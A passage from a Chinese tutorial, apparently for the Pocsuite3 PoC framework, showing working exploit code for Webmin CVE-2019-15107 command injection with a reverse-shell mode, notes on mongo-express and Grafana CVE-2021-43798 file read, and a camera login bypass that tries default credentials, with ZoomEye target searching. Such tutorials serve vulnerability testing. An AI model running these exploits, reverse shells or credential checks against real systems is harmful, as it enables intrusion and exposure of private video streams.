            # 统一调用 self.parse_output() 返回结果
            return self.parse_output(result)
        # shell 模式的实现
        def _shell(self):
            try:
                self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
            except Exception:
                pass
    # 将该 PoC 注册到框架。
    register_poc(DemoPOC)
在以上 PoC 模版的基础上，结合漏洞细节，重写 `_exploit()` 方法，如下：
    def _exploit(self, param=''):
        if not self._check(dork='Login to Webmin'):
            return False
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url}/session_login.cgi'
        }
        payload = f'user=rootxx&pam=&expired=2&old=test|{param}&new1=test2&new2=test2'
        res = requests.post(f'{self.url}/password_change.cgi', headers=headers, data=payload)
        logger.debug(res.text)
        return res.text.split('The current password is incorrect')[-1].split('')[0]
然后就是搭建 docker 靶场测试了，`docker run -it --rm -p 10000:10000
pocsuite3/cve-2019-15107`。
verify 模式 ok：
attack 模式获取命令行参数执行并返回结果，`--options` 参数可以查看 PoC 定义的额外命令行参数：
shell 模式用 bash 的反连回不来，未深究，改用 python 的就可以了。需要注意的是，由于反连 payload
存在一些特殊字符，需要结合漏洞具体情况具体分析，比如使用 base64 编码等绕过限制。
         def _shell(self):
             try:
    -            self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
    +            self._exploit(REVERSE_PAYLOAD.PYTHON.format(get_listener_ip(), get_listener_port()))
             except Exception:
                 pass
shell 模式 ok：
## 5.4 mongo-express 认证远程代码执行漏洞（CVE-2019-10758）
漏洞细节：[mongo-express远程代码执行漏洞（CVE-2019-10758）](https://www.seebug.org/vuldb/ssvid-98116)
Mongo-express 是一个基于 Node.js 和 express 的开源的 MongoDB Web 管理界面。`mongo-express 
漏洞验证，通过命令行参数 `--user admin --pwd pass --oob-server interact.sh`
分别指定了用户名、密码、和使用的 DNSLog 服务地址，也可以不指定，使用默认值。
## 5.5 Grafana 未授权任意文件读取漏洞（CVE-2021-43798）
漏洞细节：[Grafana 文件读取漏洞分析与汇总(CVE-2021-43798)](https://blog.riskivy.com/grafana-任意文件读取漏洞分析与汇总cve-2021-43798/)
Grafana 是一个跨平台、开源的数据可视化网络应用程序平台。`Grafana v8.0.0-beta1` 到 `v8.3.0`
存在未授权任意文件读取漏洞。
生成模版：
    →pocsuite --new
    ...
    -----    Seebug ssvid (eg, 99335) [0]: 99398
    PoC author (eg, Seebug) []: Seebug
    Vulnerability disclosure date (eg, 2021-8-18) [2022-07-11]: 2021-12-07
    Advisory URL (eg, https://www.seebug.org/vuldb/ssvid-99335) [https://www.seebug.org/vuldb/ssvid-99398]:
    Vulnerability CVE number (eg, CVE-2021-22123) []: CVE-2021-43798
    Vendor name (eg, Fortinet) []:
    Product or component name (eg, FortiWeb) []: Grafana
    Affected version (eg, 1.24.3` 版本会从请求 URL 中删除 `../`，这影响了很多安全工具，具体可见
issue：
Pocsuite3 hook 了 urllib3 和 requests 的部分代码，支持 `../`，同时取消了对特殊字符的编码。
## 5.6 某网络摄像头登录绕过漏洞
漏洞细节：[某网络摄像头登录绕过及多个基于堆栈溢出的远程代码执行漏洞及数据分析报告](https://paper.seebug.org/653/)
该品牌摄像头的 Web 服务基于 HTTP
基本认证，存在三组默认凭证，分别对应不同的权限等级。三组默认凭证分别为：`admin:admin`，`user:user`，`guest:guest`，安装时
APP 只会提醒修改 admin 账户的默认密码。
值得一提的是，user 账户和 guest 账户也可以查看视频流，大部分用户不会修改这些账户的默认密码，导致隐私泄漏。
生成模版：
    →pocsuite --new
    ...
    0    Arbitrary File Read
    1    Code Execution
    2    Command Execution
    3    Denial Of service
    4    Information Disclosure
    5    Login Bypass
    6    Path Traversal
    7    SQL Injection
    8    SSRF
    9    XSS
    Vulnerability type, choose from above or provide (eg, 3) []: 5
    ...
修改模版：
    -    def _options(self):
    -        o = OrderedDict()
    -        o['param'] = OptString('', description='The param')
    -        return o
    -         def _exploit(self, param=''):
    -        if not self._check(dork=''):
    +        if not self._check(dork='Error: username or password error,please input again.'):
                 return False
    -        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    -        payload = 'a=b'
    -        res = requests.post(self.url, headers=headers, data=payload)
    -        logger.debug(res.text)
    -        return res.text
    +        creds = {'admin': 'admin', 'user': 'user', 'guest': 'guest'}
    +        valid_creds = {}
    +        for u, p in creds.items():
    +            res = requests.get(self.url, auth=(u, p))
    +            if res.status_code != 401:
    +                valid_creds[u] = p
    +        return valid_creds
         def _verify(self):
             result = {}
    @@ -53,17 +48,11 @@ class DemoPOC(POCBase):
             if res:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
    -            result['VerifyInfo'][param] = res
    +            result['VerifyInfo']['Info'] = res
             return self.parse_output(result)
         def _attack(self):
    -        result = {}
    -        param = self.get_option('param')
    -        res = self._exploit(param)
    -        result['VerifyInfo'] = {}
    -        result['VerifyInfo']['URL'] = self.url
    -        result['VerifyInfo'][param] = res
    -        return self.parse_output(result)
    +        return self._verify()
使用 `--dork-zoomeye` 指定关键词从 ZoomEye 检索目标进行检测。
# 6 最后
如果在使用过程中遇到任何问题，或者有啥新想法，欢迎提交 issue
() 或者 PR
()
附Pocsuite3演示视频：
* * *